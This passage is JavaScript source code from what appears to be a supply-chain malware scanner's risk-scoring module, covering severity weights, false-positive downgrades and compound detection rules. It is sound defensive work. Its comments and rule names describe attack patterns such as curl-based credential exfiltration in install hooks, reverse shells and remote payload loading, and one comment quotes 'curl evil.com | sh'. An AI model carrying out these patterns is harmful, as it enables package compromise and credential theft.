const { getRule } = require('./rules/index.js');
const { HIGH_CONFIDENCE_MALICE_TYPES } = require('./monitor/classify.js');
// v2.10.73 P1: bundle detection helpers — extended bundle path regex + veto check
const { BUNDLE_PATH_RE, hasBundleVetoSignal } = require('./shared/bundle-detect.js');

// ============================================
// SCORING CONSTANTS
// ============================================
// Severity weights for risk score calculation (0-100)
// These values determine the impact of each threat type on the final score.
// Example: 4 CRITICAL threats = 100 (max score), 10 HIGH threats = 100
const SEVERITY_WEIGHTS = {
  // CRITICAL: Threats with immediate impact (active malware, data exfiltration)
  // High weight because a single critical threat justifies immediate action
  CRITICAL: 25,

  // HIGH: Serious threats (dangerous code, known malicious dependencies)
  // 10 HIGH threats reach the maximum score
  HIGH: 10,

  // MEDIUM: Potential threats (suspicious patterns, light obfuscation)
  // Moderate impact, requires investigation but not necessarily malicious
  MEDIUM: 3,

  // LOW: Informational findings, minimal impact on risk score
  LOW: 1
};

// Thresholds for determining the overall risk level
const RISK_THRESHOLDS = {
  CRITICAL: 75,  // >= 75: Immediate action required
  HIGH: 50,      // >= 50: Priority investigation
  MEDIUM: 25     // >= 25: Monitor
  // < 25 && > 0: LOW
  // === 0: SAFE
};

// Maximum score (capped)
const MAX_RISK_SCORE = 100;

// Cap MEDIUM prototype_hook contribution — MEDIUM hooks are framework class extensions
// (Request/Response/App/Router) which are not security risks. Capped at 15 points (5 × MEDIUM weight)
// to limit noise while preserving some signal. CRITICAL and HIGH prototype_hook findings still score normally.
const PROTO_HOOK_MEDIUM_CAP = 15;

// R4: suspicious_dataflow(MEDIUM) is a co-occurrence signal, not a standalone detection.
// Multiple env_read/telemetry distant flows in the same file should not inflate the score.
// Compounds (lifecycle_dataflow) provide the real signal and score separately.
const DATAFLOW_MEDIUM_CAP = 3;

// Confidence-weighted scoring factors (v2.7.10)
// High-confidence detections (eval, IOC, shell injection) score at full weight.
// Medium-confidence heuristics (lifecycle_script, obfuscation, high_entropy) are discounted.
// Low-confidence informational findings (possible_obfuscation, base64_in_script) are heavily discounted.
// Unknown/paranoid rules default to 1.0 (no penalty).
const CONFIDENCE_FACTORS = { high: 1.0, medium: 0.85, low: 0.6 };

// Mutable copies for configurable overrides (reset after each scan)
let _severityWeights = { ...SEVERITY_WEIGHTS };
let _riskThresholds = { ...RISK_THRESHOLDS };

/**
 * Apply config overrides to scoring parameters.
 * @param {object} config - validated config from config.js
 */
function applyConfigOverrides(config) {
  if (config.severityWeights) {
    if (config.severityWeights.critical !== undefined) _severityWeights.CRITICAL = config.severityWeights.critical;
    if (config.severityWeights.high !== undefined) _severityWeights.HIGH = config.severityWeights.high;
    if (config.severityWeights.medium !== undefined) _severityWeights.MEDIUM = config.severityWeights.medium;
    if (config.severityWeights.low !== undefined) _severityWeights.LOW = config.severityWeights.low;
  }
  if (config.riskThresholds) {
    if (config.riskThresholds.critical !== undefined) _riskThresholds.CRITICAL = config.riskThresholds.critical;
    if (config.riskThresholds.high !== undefined) _riskThresholds.HIGH = config.riskThresholds.high;
    if (config.riskThresholds.medium !== undefined) _riskThresholds.MEDIUM = config.riskThresholds.medium;
  }
}

/** Reset scoring parameters to defaults (call after each scan to prevent state leak). */
function resetConfigOverrides() {
  _severityWeights = { ...SEVERITY_WEIGHTS };
  _riskThresholds = { ...RISK_THRESHOLDS };
}

/** Get current severity weights (for enrichment in index.js). */
function getSeverityWeights() {
  return _severityWeights;
}

/** Get current risk thresholds (for external consumers). */
function getRiskThresholds() {
  return _riskThresholds;
}

// ============================================
// PER-FILE MAX SCORING (v2.2.11)
// ============================================
// Threat types classified as package-level (not tied to a specific source file).
// These are added to the package score, not grouped by file.
const PACKAGE_LEVEL_TYPES = new Set([
  'lifecycle_script', 'lifecycle_shell_pipe',
  'lifecycle_added_critical', 'lifecycle_added_high', 'lifecycle_modified',
  'known_malicious_package', 'dependency_ioc_match', 'typosquat_detected',
  'shai_hulud_marker', 'suspicious_file',
  'pypi_malicious_package', 'pypi_typosquat_detected',
  'dangerous_api_added_critical', 'dangerous_api_added_high', 'dangerous_api_added_medium',
  'publish_burst', 'dormant_spike', 'rapid_succession',
  'suspicious_maintainer', 'sole_maintainer_change',
  'sandbox_network_activity', 'sandbox_file_changes', 'sandbox_process_spawns',
  'sandbox_canary_exfiltration',
  // Compound scoring rules — package-level co-occurrences
  'lifecycle_typosquat', 'lifecycle_inline_exec', 'lifecycle_remote_require',
  'lifecycle_dataflow', 'lifecycle_dangerous_exec', 'obfuscated_lifecycle_env',
  // RT-C1: dependency boundary-squat family (Axios UNC1069 March 2026)
  'dependency_typosquat', 'dependency_typosquat_require',
  // Blue Team v8: package-level boost signals
  'isolated_suspicious_file', 'deep_suspicious_file',
  // Blue Team v8b: phantom lifecycle scripts
  'lifecycle_missing_script',
  // v2.10.89: Security review compounds
  'lifecycle_newsletter_hijack', 'lifecycle_env_exfil',
  'curl_env_exfil', 'version_99_preinstall',
  // v2.10.94: new package-level type for ltidi chain attack (dep URL on third-party host)
  'external_tarball_dep',
  // intel-triage P1.3: stub-package detector closes ltidi gap (memory project_detection_gap_ltidi_chain)
  'stub_package_external_payload', 'stub_package_external_dep',
  // intel-triage P3.1 family compounds
  'axios_family', 'stub_with_string_ioc',
  // audit DF-C1: emitted when MAX_GRAPH_NODES exceeded so cross-file blind spot is visible in scoring
  'large_package_graph_truncated',
  // audit MR-C1: informational signal that the scan target is a monorepo root (per-workspace scoring TBD)
  'monorepo_detected'
]);

// ============================================
// Hybrid v3 Phase 1: SINGLE-FIRE CRITICAL FLOOR
// ============================================
// Threat types that, when fired at HIGH+ severity, deterministically push the
// package score to a CRITICAL floor — bypassing additive aggregation, FP
// caps, and contextual reductions.
//
// Empirically validated on a 2508-pkg labeled corpus (2332 FP / 176 MW):
// every entry produced 0 FP false-lifts at MIN severity HIGH. The IOC-based
// types are deterministic by construction (equality match against curated
// IOC lists). lifecycle_shell_pipe is the "curl evil.com | sh" pattern in an
// install script — observed 1mw / 0fp.
//
// Rejected during validation (precision data attached):
//   cross_file_dataflow      26fp / 13mw  (67%)
//   reverse_shell            16fp /  3mw  (16%)
//   module_load_bypass        4fp /  1mw  (20%)
//   newsletter_auto_follow    1fp /  1mw  (50%)
//
// Re-evaluate the candidate list when the corpus or rule definitions change.
const SINGLE_FIRE_CRITICAL_TYPES = new Set([
  'known_malicious_hash',
  'known_malicious_package',
  'pypi_malicious_package',
  'shai_hulud_marker',
  'lifecycle_shell_pipe'
]);
const SINGLE_FIRE_CRITICAL_FLOOR = 75;
const SINGLE_FIRE_MIN_SEVERITY_RANK = 2; // HIGH
const _SEV_RANK = { LOW: 0, MEDIUM: 1, HIGH: 2, CRITICAL: 3 };

/**
 * Classify a threat as package-level or file-level.
 * Package-level: metadata findings (package.json, node_modules, sandbox)
 * File-level: code-level findings in specific source files
 */
function isPackageLevelThreat(threat) {
  if (PACKAGE_LEVEL_TYPES.has(threat.type)) return true;
  if (threat.file === 'package.json') return true;
  if (threat.file && (threat.file.startsWith('node_modules/') || threat.file.startsWith('node_modules\\'))) return true;
  if (threat.file && threat.file.startsWith('[SANDBOX]')) return true;
  return false;
}

/**
 * Compute a risk score for a group of threats using standard weights.
 * Handles prototype_hook MEDIUM cap per group.
 * @param {Array} threats - array of threat objects (after FP reductions)
 * @returns {number} score 0-100
 */
// Hybrid v3 Phase 3: threats tagged with replacedByCompound (their compound has
// fired and represents their score) contribute 0 to the group score. Avoids the
// additive double-count of compound + constituents. Audit 2026-05 SC-C1: the
// previous MUADDIB_COMPOUND_REPLACE env-var gate is removed — the tag posed by
// applyCompoundBoosts is now honored unconditionally.

function computeGroupScore(threats) {
  // Score decay default ON since v2.11.9 (FPR plan Chantier 1). Opt-out: MUADDIB_DECAY=0.
  if (process.env.MUADDIB_DECAY !== '0') return computeGroupScoreDecay(threats);
  let score = 0;
  let protoHookMediumPoints = 0;
  let dataflowMediumPoints = 0;

  for (const t of threats) {
    if (t.replacedByCompound) continue;
    const weight = _severityWeights[t.severity] || 0;
    const rule = getRule(t.type);
    const factor = CONFIDENCE_FACTORS[rule.confidence] || 1.0;

    if (t.type === 'prototype_hook' && t.severity === 'MEDIUM') {
      protoHookMediumPoints += weight * factor;
      continue;
    }
    if (t.type === 'suspicious_dataflow' && t.severity === 'MEDIUM') {
      dataflowMediumPoints += weight * factor;
      continue;
    }

    score += weight * factor;
  }

  score += Math.min(protoHookMediumPoints, PROTO_HOOK_MEDIUM_CAP);
  score += Math.min(dataflowMediumPoints, DATAFLOW_MEDIUM_CAP);
  return Math.min(MAX_RISK_SCORE, Math.round(score));
}

// ============================================
// Hybrid v3 Phase 2: PER-TYPE BOUNDED DECAY
// ============================================
// Replaces additive sum-of-weights with geometric decay per (severity, type)
// pair, then sums distinct buckets. Repetitions of the SAME type within a
// severity bucket get diminishing weight (the second emission counts ~half,
// the third ~quarter…); distinct types each get their own full-weight first
// emission. This rewards diversity (multiple distinct dangerous behaviors)
// and dampens repetition (the same finding scattered across many files —
// the typical FP signature of minified bundles, framework loaders, HTTP
// libraries with multiple credential-parsing paths).
//
// CRITICAL is kept additive — typical malware presents 1-3 CRITICALs and
// dampening them risks dropping detections below the CRITICAL tier.
//
// Per-(severity, type) cap: sev_weight / (1 - α). Default α:
//   HIGH α=0.5 → cap 10 / 0.5 = 20 per type
//   MEDIUM α=0.4 → cap 3 / 0.6 = 5 per type
//   LOW α=0.3 → cap 1 / 0.7 ≈ 1.43 per type
// Special MEDIUM caps (prototype_hook, suspicious_dataflow) survive as
// stricter outside-bucket caps.
// HIGH α=1.0 = additive (no decay) — HIGH threats are already discriminative
// per AUC analysis; capping them risks dropping malware at the 75 boundary.
// Decay applies only to MEDIUM/LOW where pile-up FP signature is dominant
// (minified bundles, framework loaders, HTTP credential parsers).
const DECAY_ALPHA = { HIGH: 1.0, MEDIUM: 0.4, LOW: 0.3 };

function computeGroupScoreDecay(threats) {
  let criticalSum = 0;
  let protoHookMediumPoints = 0;
  let dataflowMediumPoints = 0;
  // Per-(severity, type) array of points. Within each, decay applies.
  // Across types, scores sum.
  const typeBuckets = new Map();

  for (const t of threats) {
    if (t.replacedByCompound) continue;
    const weight = _severityWeights[t.severity] || 0;
    const rule = getRule(t.type);
    const factor = CONFIDENCE_FACTORS[rule.confidence] || 1.0;
    const points = weight * factor;

    if (t.severity === 'CRITICAL') { criticalSum += points; continue; }
    if (t.type === 'prototype_hook' && t.severity === 'MEDIUM') {
      protoHookMediumPoints += points; continue;
    }
    if (t.type === 'suspicious_dataflow' && t.severity === 'MEDIUM') {
      dataflowMediumPoints += points; continue;
    }

    const key = t.severity + '|' + t.type;
    if (!typeBuckets.has(key)) typeBuckets.set(key, []);
    typeBuckets.get(key).push(points);
  }

  let score = criticalSum;
  for (const [key, arr] of typeBuckets) {
    const sev = key.slice(0, key.indexOf('|'));
    const alpha = DECAY_ALPHA[sev] || 0;
    arr.sort((a, b) => b - a);
    let typeScore = 0;
    for (let i = 0; i < arr.length; i++) typeScore += arr[i] * Math.pow(alpha, i);
    score += typeScore;
  }
  score += Math.min(protoHookMediumPoints, PROTO_HOOK_MEDIUM_CAP);
  score += Math.min(dataflowMediumPoints, DATAFLOW_MEDIUM_CAP);
  return Math.min(MAX_RISK_SCORE, Math.round(score));
}

// ============================================
// FP REDUCTION POST-PROCESSING
// ============================================
// Legitimate frameworks produce high volumes of certain threat types that
// malware never does. This function downgrades severity when the count
// exceeds thresholds only seen in legitimate codebases.
const FP_COUNT_THRESHOLDS = {
  dynamic_require: { maxCount: 10, from: 'HIGH', to: 'LOW' },
  // Audit v3 B3: removed `from` constraint (was MEDIUM-only). Frameworks like sinon/superagent/riot
  // use 5+ Function() calls at MEDIUM and HIGH severity for spy/mock/template compilation.
  // Real malware uses 1-2 targeted Function() calls.
  dangerous_call_function: { maxCount: 5, to: 'LOW' },
  require_cache_poison: { maxCount: 3, from: 'CRITICAL', to: 'LOW' },
  // Audit 2026-05 SC-C2: floorEligible: true opts suspicious_dataflow into the
  // dilution floor without adding a `from` constraint (which would block MEDIUM
  // count-threshold downgrades). Restores 1 instance at original severity so an
  // attacker can't dilute real exfil flows by injecting benign data flows.
  suspicious_dataflow: { maxCount: 3, to: 'LOW', floorEligible: true },
  obfuscation_detected: { maxCount: 3, to: 'LOW' },
  module_compile_dynamic: { maxCount: 3, from: 'HIGH', to: 'LOW' },
  module_compile: { maxCount: 3, from: 'HIGH', to: 'LOW' },
  zlib_inflate_eval: { maxCount: 2, from: 'CRITICAL', to: 'LOW' },
  // Build tools (webpack, jest) legitimately use vm.runInThisContext for module evaluation
  vm_code_execution: { maxCount: 3, from: 'HIGH', to: 'LOW' },
  // P4: plugin loaders legitimately use many dynamic imports (webpack, eslint, knex, gatsby)
  dynamic_import: { maxCount: 5, from: 'HIGH', to: 'LOW' },
  // P4: hash algorithms contain bit manipulation that triggers obfuscation heuristics
  js_obfuscation_pattern: { maxCount: 1, from: 'HIGH', to: 'LOW' },
  // P4: bundled credential_tampering from minified alias resolution (jspdf, lerna)
  credential_tampering: { maxCount: 5, to: 'LOW' },
  // B1 FP reduction: bundled code aliases eval/Function (sinon, storybook, vitest)
  // FP fix: also cover HIGH severity (setTimeout+stringBuildVar in minified code)
  dangerous_call_eval: { maxCount: 3, to: 'LOW' },
  // P6: HTTP client libraries (undici, aws-sdk, nodemailer, jsdom) parse Authorization/Bearer headers
  // with 3+ credential regexes. Real harvesters use 1-2 targeted regexes.
  // Audit v3: removed `from` constraint — ALL severity levels downgraded when count > 2.
  // Audit 2026-05 SC-C2: floorEligible: true restores 1 instance at original
  // severity. Without it an attacker injects 3+ benign header regexes (Authorization,
  // Cookie, X-Forwarded-For) and downgrades all real exfil regexes to LOW.
  credential_regex_harvest: { maxCount: 2, to: 'LOW', floorEligible: true },
  // P7→Audit v3: Config frameworks (pm2, nx, dotenv, aws-sdk, oclif) read 5+ env vars — not credential theft.
  // Real stealers access 1-4 targeted env vars. Count >4 = config loader pattern.
  // Lowered from 10→4 for better FP reduction. B5 network_sink_immunity protects genuine exfiltration.
  env_access: { maxCount: 4, from: 'HIGH', to: 'LOW' },
  // P7: Bundled files with 5+ high-entropy strings are data files, not malware payloads.
  // Real payloads use 1-2 targeted encoded strings. Count >5 = bundled assets/data.
  high_entropy_string: { maxCount: 5, to: 'LOW' },
  // Audit v3: Libraries with >10 prototype modifications are frameworks/protocol implementations,
  // not targeted prototype hooking attacks. Real malware hooks 1-3 specific prototypes.
  prototype_hook: { maxCount: 10, to: 'LOW' },
  // Audit v3 B3: Crypto libraries (node-forge, crypto-js) legitimately use 4+ createDecipher calls.
  // Real malware uses 1-2 targeted decipher operations. Count >3 = crypto library.
  crypto_decipher: { maxCount: 3, from: 'HIGH', to: 'LOW' },
  // Audit v3 B3: HTML template engines (bull, handlebars) have many possible_obfuscation hits
  // from complex string manipulation. Real obfuscation uses intentional encoding, not template patterns.
  possible_obfuscation: { maxCount: 5, to: 'LOW' },
  // Audit v3 B3: Formatter/parser libraries (prettier, svelte) use multiple Unicode variation
  // selectors for character normalization. Real attacks use 1-2 targeted decoders.
  unicode_variation_decoder: { maxCount: 3, to: 'LOW' },
  // Audit v3 B3: State management/reactive frameworks (MobX, Vue, Immer, htmx) use multiple
  // Proxy traps for reactivity/observation. Real data interception uses 1-2 targeted traps.
  proxy_data_intercept: { maxCount: 3, to: 'LOW' },
  // Audit v3 B3: Config/CLI libraries (dotenv, oclif, np) read multiple sensitive env vars
  // as part of their core functionality. Lowered from 10→5 for env_access count threshold.
  // The B5 network_sink_immunity above protects genuine exfiltration scenarios.
  sensitive_string: { maxCount: 5, to: 'LOW' },
  // Audit v3 B3: Template engines (htmx, marko) with many staged_payload hits are using
  // fetch+eval for dynamic content loading, not payload staging. fetch_decrypt_exec (triple
  // signal) remains unaffected. Also in DIST_BUNDLER_ARTIFACT_TYPES for dist/ files.
  staged_payload: { maxCount: 3, to: 'LOW' }
};

// Types exempt from dist/ downgrade — IOC matches, lifecycle scripts, and
// high-confidence compound detections are always real even in dist/ files
const DIST_EXEMPT_TYPES = new Set([
  'ioc_match', 'known_malicious_package', 'pypi_malicious_package', 'shai_hulud_marker',
  'ioc_string_match', 'anti_forensic_xor_autodelete', 'anti_forensic_partial',
  'lifecycle_script', 'lifecycle_shell_pipe',
  'lifecycle_added_critical', 'lifecycle_added_high', 'lifecycle_modified',
  // Compound detections — require multiple correlated signals, not single-pattern FPs
  'zlib_inflate_eval',        // zlib + base64 + eval (event-stream pattern)
  'fetch_decrypt_exec',       // fetch + decrypt + eval (steganographic chain)
  'download_exec_binary',     // download + chmod + exec (binary dropper)
  'cross_file_dataflow',      // credential read → network exfil across files
  'staged_eval_decode',       // eval(atob(...)) (explicit payload staging)
  'reverse_shell',            // net.Socket + connect + pipe (always malicious)
  // detached_credential_exfil removed from DIST_EXEMPT: in dist/ files, co-occurrence of
  // detached_process + env_access + network is coincidental bundler aggregation.
  // Kept in REACHABILITY_EXEMPT_TYPES (lifecycle invocation is valid).
  'node_modules_write',       // writeFile to node_modules/ (worm propagation)
  'npm_publish_worm',         // exec("npm publish") (worm propagation)
  'curl_env_exfil',           // curl/wget env exfil in lifecycle (always malicious)
  'function_constructor_require', // new Function.constructor("require") (always malicious)
  'self_destruct_eval',       // dynamic exec + unlink __filename (csec anti-forensics)
  'function_runtime_args',    // new Function('require','__dirname','__filename',...) + obfuscation (csec)
  'external_tarball_dep',     // dep URL tarball on third-party host (ltidi chain)
  // Dangerous shell commands in dist/ are real threats, never bundler output
  'dangerous_exec',
  // Compound scoring rules — co-occurrence signals, never FP
  'crypto_staged_payload', 'lifecycle_typosquat',
  'lifecycle_inline_exec', 'lifecycle_remote_require',
  'lifecycle_file_exec',  // B6: lifecycle → malicious file compound
  'lifecycle_dataflow', 'lifecycle_dangerous_exec', 'obfuscated_lifecycle_env',
  // RT-C1: Boundary-squat compound is never coincidental (dep declared AND require()d)
  'dependency_typosquat_require'
  // P6: remote_code_load and proxy_data_intercept removed — in bundled dist/ files,
  // fetch + eval co-occurrence is coincidental (bundler combines HTTP client + template compilation).
  // fetch_decrypt_exec (fetch+decrypt+eval triple) remains exempt — never coincidental.
]);

// Regex matching dist/build/out/output/minified/bundled file paths.
// P7: added out/ and output/ — common build output directories (esbuild, custom build scripts)
// v2.10.73 P1: DIST_FILE_RE is kept as the narrow legacy regex for backwards compat
// with existing call sites (other rules reference it). The EXTENDED bundle match is
// done via BUNDLE_PATH_RE from src/shared/bundle-detect.js — used in the new gate below.
// BUNDLE_PATH_RE covers: .umd.js, .esm.js, .es.js, .common.js, .max.js, hash chunks,
// fesm*/, browser/, assets/, chunks/, _app/, lib/bundled/.
const DIST_FILE_RE = /(?:^|[/\\])(?:dist|build|out|output)[/\\]|\.min\.js$|\.bundle\.js$/i;

// Bundler artifact types: get two-notch downgrade in dist/ files (CRITICAL→MEDIUM, HIGH→LOW).
// These are individual pattern signals that bundlers routinely produce (eval for globalThis,
// dynamic require for code-splitting, minification obfuscation, etc.)
const DIST_BUNDLER_ARTIFACT_TYPES = new Set([
  'dangerous_call_eval', 'dangerous_call_function',
  'dynamic_require', 'dynamic_import',
  'obfuscation_detected', 'high_entropy_string', 'possible_obfuscation',
  'js_obfuscation_pattern', 'vm_code_execution',
  'module_compile', 'module_compile_dynamic', 'unicode_variation_decoder',
  // P7: env_access in dist/ is bundled SDK config reading, not credential theft
  'env_access',
  // P8: Proxy traps in dist/ are state management frameworks (MobX, Vue reactivity, Immer),
  // not malicious data interception. Two-notch downgrade (CRITICAL→MEDIUM, HIGH→LOW).
  'proxy_data_intercept',
  // P9: fetch+eval in dist/ is Vite/Webpack code splitting (lazy chunk loading),
  // not remote code execution. Two-notch downgrade (CRITICAL→MEDIUM, HIGH→LOW).
  'remote_code_load',
  // P10: In dist/ bundles, binary file refs + crypto are coincidental bundler aggregation
  // (webpack bundles crypto utils alongside image processing). Real steganographic attacks
  // (flatmap-stream) have these at package root, not dist/. Compound (crypto_staged_payload)
  // is in DIST_EXEMPT_TYPES so the overall signal is preserved when truly malicious.
  'staged_binary_payload', 'crypto_decipher',
  // Audit v3 B3: staged_payload (fetch+eval) in dist/ is code splitting / lazy loading,
  // not malicious payload staging. fetch_decrypt_exec remains exempt (triple signal).
  'staged_payload'
  // v2.10.73 P1: credential_regex_harvest, suspicious_dataflow, string_mutation_obfuscation
  // are NOT added here (kept in the one-notch path) — existing scoring-hardening tests
  // (FP-P7 etc.) require these to receive a single-notch downgrade to stay visible as
  // MEDIUM in bundles. The real benefit for these types comes from the extended
  // BUNDLE_PATH_RE (src/shared/bundle-detect.js) which now matches .umd/.esm/.es/.common/
  // .max suffixes, fesm*/, browser/, assets/, chunks/, hash-suffixed chunks — paths
  // where the old narrow DIST_FILE_RE missed the bundle files entirely. One-notch
  // downgrade on a broader set of bundle paths is enough to bring FP clusters under
  // the webhook threshold without compromising true positive detection.
]);

// Types exempt from reachability downgrade — IOC matches, lifecycle, and package-level types.
// NOTE: Uses the base IOC/lifecycle exempt set, NOT full DIST_EXEMPT_TYPES.
// Compound detections (zlib_inflate_eval, staged_eval_decode, etc.) should still be
// downgraded if the file is truly unreachable, since unreachable code cannot execute.
const REACHABILITY_BASE_EXEMPT = new Set([
  'ioc_match', 'known_malicious_package', 'pypi_malicious_package', 'shai_hulud_marker',
  'ioc_string_match', 'anti_forensic_xor_autodelete', 'anti_forensic_partial',
  'lifecycle_script', 'lifecycle_shell_pipe',
  'lifecycle_added_critical', 'lifecycle_added_high', 'lifecycle_modified'
]);
const REACHABILITY_EXEMPT_TYPES = new Set([
  ...REACHABILITY_BASE_EXEMPT,
  'cross_file_dataflow',
  'typosquat_detected', 'pypi_typosquat_detected',
  'pypi_malicious_package',
  'ai_config_injection', 'ai_config_injection_compound',
  'detached_credential_exfil', // DPRK/Lazarus: invoked via lifecycle, not require/import
  'native_addon_install', // binding.gyp executes during npm install but isn't require()'d
  // Staged loader pattern (chai-* / poxios-chain campaign 2026-05): the malicious
  // file is loaded indirectly (transport.js requires caller.js) and reachability
  // resolution can fail, demoting CRITICAL to LOW. These types are unambiguously
  // malicious — no legitimate code shadows process, calls Function.constructor("require"),
  // or self-destructs after running new Function(...).
  'function_constructor_require',  // AST-086 — Function.constructor("require", body)
  'process_variable_shadow',       // AST-087 — const process = {env:{...}}
  'function_runtime_args',         // AST-090 — new Function('require','__dirname',...)
  'self_destruct_eval',            // AST-089 — dynamic exec + unlink __filename
  // Mini Shai-Hulud campaign (2026-05): env var names reconstructed via
  // String.fromCharCode() to evade static analysis. Structurally unique to malware —
  // no legitimate code reconstructs env var names from character codes. Injected files
  // (router_init.js) are unreachable via require/import but execute via lifecycle hooks
  // or optionalDependencies with prepare scripts.
  'env_charcode_reconstruction'    // AST-018 — fromCharCode + process.env[computed]
]);

// ============================================
// COMPOUND SCORING RULES (v2.9.2)
// ============================================
// Co-occurrences of threat types that NEVER appear in benign packages.
// Applied AFTER FP reductions to recover signals that were individually downgraded.
// Each compound injects a new CRITICAL threat when all required types are present.
const SCORING_COMPOUNDS = [
  {
    type: 'crypto_staged_payload',
    requires: ['staged_binary_payload', 'crypto_decipher'],
    severity: 'CRITICAL',
    message: 'Binary file reference + crypto decryption — steganographic payload chain (scoring compound).',
    fileFrom: 'staged_binary_payload',
    sameFile: true // Real steganographic attacks (flatmap-stream) have crypto+binary in the SAME file
  },
  {
    type: 'lifecycle_typosquat',
    requires: ['lifecycle_script', 'typosquat_detected'],
    severity: 'CRITICAL',
    message: 'Lifecycle hook on typosquat package — dependency confusion attack vector (scoring compound).',
    fileFrom: 'typosquat_detected'
  },
  {
    // RT-C1: Boundary-squat dep declared AND require()d in code → CRITICAL.
    // Pattern Axios UNC1069 (March 2026): wrapper looks benign, payload is in the dep.
    type: 'dependency_typosquat_require',
    requires: ['dependency_typosquat', 'dependency_typosquat_used'],
    severity: 'CRITICAL',
    message: 'Boundary-squat dependency declared AND require()d in code — Axios UNC1069 pattern (scoring compound).',
    fileFrom: 'dependency_typosquat_used'
  },
  {
    // RT-C1-FPR (audit 2026-05): boundary-squat dep + lifecycle hook → install-time
    // payload delivery via typosquat sub-dep. Mirror of dependency_typosquat_require
    // but with lifecycle instead of _used: stronger signal — proves install-time
    // execution intent without requiring explicit require() in scanned code.
    type: 'typosquat_lifecycle',
    requires: ['dependency_typosquat', 'lifecycle_script'],
    severity: 'CRITICAL',
    message: 'Boundary-squat dependency + lifecycle hook — install-time payload delivery via typosquat sub-dep (scoring compound).',
    fileFrom: 'dependency_typosquat'
    // No sameFile: both are package.json-level
  },
  {
    // RT-C1-FPR (audit 2026-05): boundary-squat dep + suspicious dataflow → typosquat
    // dep co-occurring with credential exfil. Mirror of lifecycle_dataflow (HIGH) —
    // co-occurrence without direct causal link, so HIGH not CRITICAL.
    type: 'typosquat_dataflow',
    requires: ['dependency_typosquat', 'suspicious_dataflow'],
    severity: 'HIGH',
    message: 'Boundary-squat dependency + suspicious dataflow — typosquat dep co-occurring with credential exfil (scoring compound).',
    fileFrom: 'suspicious_dataflow',
    // No sameFile: dep is package.json, dataflow is src/*.js
    excludeIfBundled: true
  },
  {
    type: 'lifecycle_inline_exec',
    requires: ['lifecycle_script', 'node_inline_exec'],
    severity: 'CRITICAL',
    message: 'Lifecycle hook with inline Node execution (node -e) — install-time code execution (scoring compound).',
    fileFrom: 'node_inline_exec'
  },
  {
    type: 'lifecycle_remote_require',
    requires: ['lifecycle_script', 'network_require'],
    severity: 'CRITICAL',
    message: 'Lifecycle hook loading remote code (require http/https) — supply chain payload delivery (scoring compound).',
    fileFrom: 'network_require'
  },
  {
    type: 'websocket_credential_exfil',
    requires: ['env_access', 'suspicious_module_sink'],
    severity: 'CRITICAL',
    message: 'Sensitive env var access + WebSocket/MQTT/Socket.io send in same file — credential exfiltration via non-HTTP channel (scoring compound).',
    fileFrom: 'env_access',
    sameFile: true
  },
  // C3 compounds (post-audit fondamental) — recovering 3336 under-threshold malwares
  {
    type: 'lifecycle_dataflow',
    requires: ['lifecycle_script', 'suspicious_dataflow'],
    severity: 'HIGH',
    message: 'Lifecycle hook + suspicious dataflow — install-time credential/data exfiltration pattern (scoring compound).',
    fileFrom: 'suspicious_dataflow',
    // No sameFile: lifecycle is package-level, dataflow is file-level
    // C7 : when every component lives only in dist/build/out, the cooccurrence
    // is bundler aggregation (a postinstall mention + a pre-bundled HTTP client
    // with credential fields), not real exfiltration. Skip the compound.
    excludeIfBundled: true,
    // v2.11.11: Scope to lifecycle target file + 1-level imports. On monorepos
    // (React, Next.js) the unscoped co-occurrence of lifecycle_script + any
    // suspicious_dataflow anywhere in the repo is noise. The compound should
    // only fire when the dataflow signal is in the file directly executed by
    // the lifecycle script or in its static imports.
    lifecycleScoped: true
  },
  {
    type: 'lifecycle_dangerous_exec',
    requires: ['lifecycle_script', 'dangerous_exec'],
    severity: 'CRITICAL',
    message: 'Lifecycle hook + dangerous shell execution — install-time command injection (scoring compound).',
    fileFrom: 'dangerous_exec',
    // No sameFile: lifecycle is package-level
    // dangerous_exec is in DIST_EXEMPT_TYPES so it is never coincidental in
    // dist/ ; no excludeIfBundled gate added here.
    // v2.11.11: Scope to lifecycle target file + 1-level imports. Without this,
    // a monorepo postinstall referencing a clean setup script correlates with
    // exec() in unrelated release/CI scripts → CRITICAL false positive.
    lifecycleScoped: true
  },
  {
    type: 'obfuscated_lifecycle_env',
    requires: ['obfuscation_detected', 'env_access', 'lifecycle_script'],
    severity: 'HIGH',
    message: 'Obfuscation + credential env access + lifecycle hook — obfuscated install-time credential theft (scoring compound).',
    fileFrom: 'env_access',
    // Only obfuscation_detected + env_access must be in the same file (lifecycle_script is package-level)
    sameFileTypes: ['obfuscation_detected', 'env_access'],
    // C7 : tighter gate - a single MEDIUM env_access alongside generic
    // obfuscation_detected in a bundler is not proof of credential theft.
    // Require at least one component with originalSeverity HIGH+ to fire.
    requireOriginalSeverityHigh: true,
    excludeIfBundled: true
  },
  // v2.10.89: Security review compounds
  {
    type: 'lifecycle_newsletter_hijack',
    requires: ['lifecycle_script', 'newsletter_auto_follow'],
    severity: 'CRITICAL',
    message: 'Lifecycle hook + newsletter auto-follow — WhatsApp Baileys channel hijack via install-time hook (scoring compound).',
    fileFrom: 'newsletter_auto_follow'
    // No sameFile: lifecycle is package-level, newsletter_auto_follow is file-level
  },
  {
    type: 'lifecycle_env_exfil',
    requires: ['lifecycle_script', 'curl_env_exfil'],
    severity: 'CRITICAL',
    message: 'Lifecycle hook + curl/wget env exfiltration — install-time credential theft (scoring compound).',
    fileFrom: 'curl_env_exfil'
    // No sameFile: both are package-level
  },
  // intel-triage P3.1 — Axios family compound. Fires when a package combines:
  //   ioc_string_match (any campaign) + lifecycle_script + anti_forensic_partial
  // Each individual signal is already CRITICAL/HIGH, so the compound mainly
  // produces a unified "axios_family" event for monitor + webhook clarity.
  {
    type: 'axios_family',
    requires: ['ioc_string_match', 'lifecycle_script', 'anti_forensic_partial'],
    severity: 'CRITICAL',
    message: 'IOC string match + lifecycle hook + anti-forensic partial in one package — Axios/csec family signature (scoring compound).',
    fileFrom: 'ioc_string_match'
  },
  // intel-triage P3.x — Stub package + IOC string compound.
  // A package that is both a stub (P1.3 detection) AND contains a known
  // string IOC is unambiguously a chain-attack staging package.
  {
    type: 'stub_with_string_ioc',
    requires: ['stub_package_external_dep', 'ioc_string_match'],
    severity: 'CRITICAL',
    message: 'Stub package with external URL dep + known string IOC — chain-attack staging package (scoring compound).',
    fileFrom: 'ioc_string_match'
  },
  // Security review 2026-05-09 — chai-* / poxios-chain / express-guardrail / justenv
  // campaign. Pattern: fork pino + caller.js with `const process = {env: {DEV_API_KEY: <base64>}}`
  // + axios.get(decoded URL) + new Function.constructor("require", body). The package
